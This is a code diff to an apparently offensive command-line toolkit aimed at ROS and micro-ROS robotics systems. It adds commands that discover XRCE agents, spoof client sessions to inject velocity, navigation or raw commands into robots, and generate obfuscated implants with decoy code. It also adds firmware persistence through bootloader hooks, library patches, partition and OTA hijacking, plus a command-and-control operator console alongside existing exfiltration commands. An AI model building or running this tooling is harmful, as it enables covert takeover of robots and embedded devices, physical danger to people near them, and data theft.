@@ -70,6 +70,14 @@ Commands (Phase 4: Post-Exploitation / C2):
     c2-exfil       - Exfiltrate data from compromised host over covert DDS channel
     c2-recv        - Receive and reassemble exfiltrated data on operator side
 
+Commands (Phase 5A: micro-ROS / XRCE):
+    microros-agent  - Discover XRCE Agents and enumerate micro-ROS participants
+    xrce-traffic    - Capture and analyze XRCE traffic for behavioral profiling
+    xrce-hijack     - Spoof XRCE client session and inject commands
+    uros-implant    - Generate micro-ROS C2 implant (C++/Arduino/Python)
+    uros-persist    - Firmware-level persistence (library patch, bootloader, OTA)
+    uros-c2         - Phase 5A C2 dispatcher (operator interface for implants)
+
 Author: Gh057x
 License: MIT — Use responsibly.
 """
@@ -1137,6 +1145,249 @@ def cmd_shodan_dds(args):
             print(f"[*] {len(hosts)} IPs exported to {args.export}")
 
 
+
+
+# =============================================================================
+# Phase 5A: micro-ROS / XRCE Commands
+# =============================================================================
+
+def cmd_microros_agent(args):
+    """Discover XRCE Agents and enumerate micro-ROS participants"""
+    from modules.phase5a.microros_agent import XRCEAgentScanner, print_agent_report, export_json as p5_export
+
+    scanner = XRCEAgentScanner(timeout=args.timeout, verbose=args.verbose)
+    agents = []
+
+    if args.network:
+        agents = scanner.scan_range(args.network, port=args.agent_port, threads=args.threads)
+    elif args.target:
+        if args.xrce_multiport:
+            agents = scanner.scan_multiport(args.target)
+        else:
+            agent = scanner.scan_port(args.target, args.agent_port)
+            if agent:
+                agents = [agent]
+    else:
+        print("[-] Specify --target or --network for microros-agent")
+        return
+
+    if args.xrce_enumerate:
+        for agent in agents:
+            participants = scanner.enumerate_participants(agent, timeout=args.timeout)
+            agent.participants = [f"{p.session_id}:{p.participant_id}" for p in participants]
+
+    print_agent_report(agents)
+
+    if args.output:
+        p5_export(agents, args.output)
+
+
+def cmd_xrce_traffic(args):
+    """Capture and analyze XRCE traffic for behavioral profiling"""
+    from modules.phase5a.xrce_traffic_analysis import XRCETrafficAnalyzer, print_analysis_report, export_json as p5_export
+
+    if not args.target:
+        print("[-] --target required for xrce-traffic (XRCE Agent IP)")
+        return
+
+    analyzer = XRCETrafficAnalyzer(
+        agent_ip=args.target,
+        agent_port=args.agent_port,
+        verbose=args.verbose,
+    )
+
+    print(f"[*] Capturing XRCE traffic from {args.target}:{args.agent_port} for {args.duration}s...")
+    count = analyzer.capture(duration=args.duration)
+
+    if count == 0:
+        print("[!] No XRCE traffic captured")
+        return
+
+    stats = analyzer.analyze()
+    print_analysis_report(stats)
+
+    if args.output:
+        p5_export(stats, args.output)
+
+    if args.pcap:
+        if analyzer.export_pcap(args.pcap):
+            print(f"[+] PCAP exported to {args.pcap}")
+
+
+def cmd_xrce_hijack(args):
+    """Spoof XRCE client session and inject commands into topics"""
+    from modules.phase5a.microros_client_hijack import XRCEClientHijacker, print_injection_report, export_json as p5_export
+
+    if not args.target:
+        print("[-] --target required for xrce-hijack (XRCE Agent IP)")
+        return
+
+    mode = args.xrce_attack or "twist"
+    session_id = int(args.xrce_session, 0) if args.xrce_session else 0x42
+
+    print(f"\n[*] XRCE hijack: {args.target}:{args.agent_port}  session={hex(session_id)}  mode={mode}")
+
+    hijacker = XRCEClientHijacker(args.target, args.agent_port, verbose=args.verbose)
+    if not hijacker.create_session(session_id=session_id):
+        print("[!] Failed to create XRCE session")
+        return
+
+    results = []
+    try:
+        topic = args.topic or "/cmd_vel"
+        if mode == "twist":
+            results = hijacker.inject_twist(
+                topic=topic,
+                linear_x=args.lx if args.lx is not None else 1.0,
+                angular_z=args.az if args.az is not None else 0.0,
+                count=args.count,
+                interval=args.interval,
+            )
+        elif mode == "nav":
+            results = hijacker.inject_nav_goal(
+                topic=args.topic or "/move_base_simple/goal",
+                x=args.x,
+                y=args.y,
+                theta=args.theta,
+                count=args.count,
+                interval=args.interval,
+            )
+        elif mode == "raw":
+            if args.payload_hex:
+                payload = bytes.fromhex(args.payload_hex)
+            elif args.payload_file:
+                with open(args.payload_file, "r") as pf:
+                    payload = bytes.fromhex(pf.read().strip())
+            else:
+                print("[!] Specify --payload-hex or --payload-file for raw mode")
+                return
+            results = hijacker.inject_raw(
+                topic=topic,
+                payload=payload,
+                count=args.count,
+                interval=args.interval,
+            )
+        else:
+            print(f"[!] Unknown xrce-hijack mode: {mode}  (use twist, nav, raw)")
+            return
+    finally:
+        hijacker.cleanup()
+
+    print_injection_report(results)
+
+    if args.output:
+        p5_export(results, hijacker.session, args.output)
+
+
+def cmd_uros_implant(args):
+    """Generate micro-ROS C2 implant source (C++/Arduino/Python)"""
+    from modules.phase5a.microros_implant import ImplantGenerator, ImplantConfig, print_generation_report
+
+    if not args.platform:
+        print("[-] --platform required for uros-implant  (cpp, arduino, python)")
+        return
+
+    config = ImplantConfig(
+        implant_id=args.implant_id or "",
+        target_platform=args.platform,
+        beacon_interval=args.beacon_interval,
+        beacon_topic=args.beacon_topic,
+        command_topic=args.command_topic,
+        obfuscate=args.obfuscate,
+        add_decoy_code=args.add_decoy,
+    )
+
+    generator = ImplantGenerator(verbose=args.verbose)
+    metadata = generator.generate(config)
+    print_generation_report(metadata)
+
+    if args.manifest:
+        generator.export_manifest(args.manifest)
+
+
+def cmd_uros_persist(args):
+    """Firmware-level persistence mechanisms for micro-ROS targets"""
+    from modules.phase5a.microros_persistence import MicroROSPersistence, PersistenceConfig, print_persistence_report, export_json as p5_export
+
+    if not args.persist_method:
+        print("[-] --persist-method required  (library_patch, bootloader, firmware_inject, partition, ota_hijack)")
+        return
+    if not args.target and args.persist_method != "ota_hijack":
+        print("[-] --target required for uros-persist (firmware/library path)")
+        return
+
+    implant_code = b""
+    if args.implant_file:
+        with open(args.implant_file, "rb") as f:
+            implant_code = f.read()
+    elif args.implant_hex:
+        implant_code = bytes.fromhex(args.implant_hex)
+
+    config = PersistenceConfig(
+        method=args.persist_method,
+        target_path=args.target or "",
+        implant_code=implant_code,
+        implant_id=args.implant_id or "",
+        bootloader_hook_addr=int(args.hook_address, 0) if args.hook_address else None,
+        partition_name=args.partition_name,
+        ota_server=args.ota_server,
+        preserve_timestamps=True,
+    )
+
+    persistence = MicroROSPersistence(verbose=args.verbose)
+
+    result = None
+    m = args.persist_method
+    if m == "library_patch":
+        result = persistence.library_patch(config)
+    elif m == "bootloader":
+        result = persistence.bootloader_hook(config)
+    elif m == "firmware_inject":
+        result = persistence.firmware_inject(config)
+    elif m == "partition":
+        result = persistence.partition_hijack(config)
+    elif m == "ota_hijack":
+        result = persistence.ota_hijack_config(config)
+
+    if result:
+        print_persistence_report(result)
+
+    if args.output:
+        p5_export(persistence.results, args.output)
+
+
+def cmd_uros_c2(args):
+    """Phase 5A C2 dispatcher -- operator console for micro-ROS implants"""
+    from modules.phase5a.c2_dispatcher import C2Dispatcher, DispatcherConfig, DispatcherCLI
+
+    config = DispatcherConfig(
+        c2_callback_ip=args.target,
+        c2_callback_port=args.dispatcher_port,
+        beacon_timeout_seconds=args.beacon_timeout,
+        log_file=args.log_file,
+        log_level="DEBUG" if args.verbose else "INFO",
+    )
+
+    dispatcher = C2Dispatcher(config, verbose=args.verbose)
+
+    if args.batch_file:
+        try:
+            with open(args.batch_file, "r") as bf:
+                for line in bf:
+                    line = line.strip()
+                    if not line or line.startswith("#"):
+                        continue
+                    print(f">>> {line}")
+                    print(dispatcher.execute_command(line))
+        except Exception as e:
+            print(f"[!] Batch error: {e}")
+    else:
+        cli = DispatcherCLI(dispatcher)
+        cli.run()
+
+    if args.export_session:
+        dispatcher.export_session(args.export_session)
+
 # =============================================================================
 # Output Formatters
 # =============================================================================
@@ -1421,7 +1672,10 @@ Examples:
                                  "ics-enum", "modbus-scan", "mqtt-scan",
                                  "opcua-scan", "aws-scan", "shodan-dds",
                                  # Phase 4: Post-Exploitation / C2
-                                 "c2-server", "c2-beacon", "c2-exfil", "c2-recv"],
+                                 "c2-server", "c2-beacon", "c2-exfil", "c2-recv",
+                                 # Phase 5A: micro-ROS / XRCE
+                                 "microros-agent", "xrce-traffic", "xrce-hijack",
+                                 "uros-implant", "uros-persist", "uros-c2"],
                         help="Command to execute")
 
     # Target options
@@ -1543,6 +1797,71 @@ Examples:
                         dest="exfil_path",
                         help="File path for exfil mode=files")
 
+    # Phase 5A: micro-ROS / XRCE options
+    parser.add_argument("--agent-port", type=int, default=8888, dest="agent_port",
+                        help="XRCE Agent UDP port (default: 8888)")
+    parser.add_argument("--xrce-multiport", action="store_true", dest="xrce_multiport",
+                        help="Scan common XRCE ports (8888, 7400-7409)")
+    parser.add_argument("--xrce-enumerate", action="store_true", dest="xrce_enumerate",
+                        help="Enumerate participants on discovered XRCE Agents")
+    parser.add_argument("--pcap", default=None,
+                        help="Export XRCE captured traffic to PCAP file")
+    parser.add_argument("--xrce-attack", choices=["twist", "nav", "raw"],
+                        default=None, dest="xrce_attack",
+                        help="XRCE hijack attack type: twist, nav, raw")
+    parser.add_argument("--xrce-session", default=None, dest="xrce_session",
+                        help="XRCE spoofed session ID (hex, default: 0x42)")
+    parser.add_argument("--theta", type=float, default=0.0,
+                        help="Nav goal orientation in radians (default: 0.0)")
+    parser.add_argument("--interval", type=float, default=0.1,
+                        help="Delay between XRCE injections in seconds (default: 0.1)")
+    parser.add_argument("--payload-file", default=None, dest="payload_file",
+                        help="File containing raw XRCE payload (hex text)")
+    parser.add_argument("--payload-hex", default=None, dest="payload_hex",
+                        help="Raw XRCE payload as hex string")
+    parser.add_argument("--platform", choices=["cpp", "arduino", "python"],
+                        default=None,
+                        help="Implant target platform (cpp, arduino, python)")
+    parser.add_argument("--implant-id", default=None, dest="implant_id",
+                        help="Implant ID (auto-generated if not specified)")
+    parser.add_argument("--beacon-interval", type=int, default=5000, dest="beacon_interval",
+                        help="Implant beacon interval in ms (default: 5000)")
+    parser.add_argument("--beacon-topic", default="/implant/beacon", dest="beacon_topic",
+                        help="Implant beacon topic base (default: /implant/beacon)")
+    parser.add_argument("--command-topic", default="/implant/command", dest="command_topic",
+                        help="Implant command topic base (default: /implant/command)")
+    parser.add_argument("--obfuscate", action="store_true",
+                        help="Strip comments from generated implant source")
+    parser.add_argument("--add-decoy", action="store_true", dest="add_decoy",
+                        help="Add decoy code to generated implant")
+    parser.add_argument("--manifest", default=None,
+                        help="Export implant manifest JSON to file")
+    parser.add_argument("--persist-method",
+                        choices=["library_patch", "bootloader", "firmware_inject",
+                                 "partition", "ota_hijack"],
+                        default=None, dest="persist_method",
+                        help="Persistence mechanism for uros-persist")
+    parser.add_argument("--implant-file", default=None, dest="implant_file",
+                        help="Binary file containing implant shellcode")
+    parser.add_argument("--implant-hex", default=None, dest="implant_hex",
+                        help="Implant shellcode as hex string")
+    parser.add_argument("--hook-address", default=None, dest="hook_address",
+                        help="Bootloader hook address (hex, e.g. 0x08000100)")
+    parser.add_argument("--partition-name", default=None, dest="partition_name",
+                        help="Partition name for ESP32 partition hijack")
+    parser.add_argument("--ota-server", default=None, dest="ota_server",
+                        help="OTA server hostname/IP for OTA hijack config")
+    parser.add_argument("--dispatcher-port", type=int, default=None, dest="dispatcher_port",
+                        help="Phase 5A dispatcher callback port")
+    parser.add_argument("--beacon-timeout", type=float, default=60.0, dest="beacon_timeout",
+                        help="Implant beacon timeout in seconds (default: 60.0)")
+    parser.add_argument("--log-file", default=None, dest="log_file",
+                        help="Dispatcher log file path")
+    parser.add_argument("--export-session", default=None, dest="export_session",
+                        help="Export dispatcher session state to JSON file")
+    parser.add_argument("--batch-file", default=None, dest="batch_file",
+                        help="Execute dispatcher commands from file (non-interactive)")
+
     # Output options
     parser.add_argument("-o", "--output", help="Output file path (JSON)")
     parser.add_argument("-v", "--verbose", action="store_true",
@@ -1597,6 +1916,13 @@ Examples:
         "c2-beacon":     cmd_c2_beacon,
         "c2-exfil":      cmd_c2_exfil,
         "c2-recv":       cmd_c2_recv,
+        # Phase 5A: micro-ROS / XRCE
+        "microros-agent": cmd_microros_agent,
+        "xrce-traffic":   cmd_xrce_traffic,
+        "xrce-hijack":    cmd_xrce_hijack,
+        "uros-implant":   cmd_uros_implant,
+        "uros-persist":   cmd_uros_persist,
+        "uros-c2":        cmd_uros_c2,
     }
 
     try:
